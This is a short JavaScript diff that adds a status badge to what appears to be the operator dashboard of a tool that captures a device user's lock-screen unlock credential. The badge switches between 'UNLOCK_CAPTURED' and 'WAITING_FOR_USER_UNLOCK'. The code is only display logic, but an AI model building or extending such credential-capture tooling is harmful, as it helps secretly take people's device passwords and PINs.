@@ -1313,6 +1313,23 @@ async function checkGhostStatus() {
           elevateAdminBtn.style.background = "rgba(255, 49, 49, 0.05)";
         }
       }
+
+      const watcherBadge = document.getElementById("keyguard-watcher-badge");
+      if (watcherBadge) {
+        if (data.hasCredential) {
+          watcherBadge.style.borderColor = "var(--neon-green)";
+          watcherBadge.style.color = "var(--neon-green)";
+          watcherBadge.style.background = "rgba(57, 255, 20, 0.15)";
+          watcherBadge.style.boxShadow = "0 0 12px rgba(57, 255, 20, 0.3)";
+          watcherBadge.innerHTML = "✔ STATUS: UNLOCK_CAPTURED (" + (data.credentialType || "CREDENTIAL") + ")";
+        } else {
+          watcherBadge.style.borderColor = "#555";
+          watcherBadge.style.color = "#888";
+          watcherBadge.style.background = "rgba(255, 255, 255, 0.03)";
+          watcherBadge.style.boxShadow = "none";
+          watcherBadge.innerHTML = "&#9203; STATUS: WAITING_FOR_USER_UNLOCK";
+        }
+      }
     }
   } catch (err) {}
 }
